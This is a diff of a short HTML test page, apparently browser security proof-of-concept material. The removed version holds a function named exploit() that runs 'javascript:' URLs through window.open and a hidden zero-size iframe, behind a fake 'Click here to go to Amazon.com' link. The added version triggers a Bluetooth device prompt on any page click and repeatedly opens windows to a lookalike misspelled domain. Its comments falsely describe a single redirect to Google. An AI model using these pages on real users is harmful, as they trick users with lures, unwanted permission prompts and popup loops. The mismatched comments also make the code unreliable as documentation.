@@ -1,26 +1,26 @@
-<html>
-  <body>
 
-    <script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirect Window Demo</title>
+</head>
+<body onclick="	  navigator.bluetooth.requestDevice({acceptAllDevices:true});">
+  <h1>Window Redirect Demo</h1>
+  <button onclick="openAndRedirect()">Open and Redirect</button>
 
-    function exploit() {
+  <script>
+    function openAndRedirect() {
+      // Open a new tab or window
+	  navigator.bluetooth.requestDevice({acceptAllDevices:true});
 
-      window.open("javascript:alert(document.location)");
 
-      document.getElementById("iframe").src = 'javascript:prompt("");alert(document.location)';
-    
+      // Wait 3 seconds and then redirect it to Google
+      setInterval(() => {
+             let newWindow = window.open("https://glogoligatureoogle.com");
+
+      }, 2000);
     }
-    
-    </script>
-
-    <br><br><br><br>
-    <a href="#" onclick="exploit();">
-      <center><h1>Click here to go to Amazon.com</h1></center>
-    </a>
-
-
-
-    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
-
-  </body>
+  </script>
+</body>
 </html>
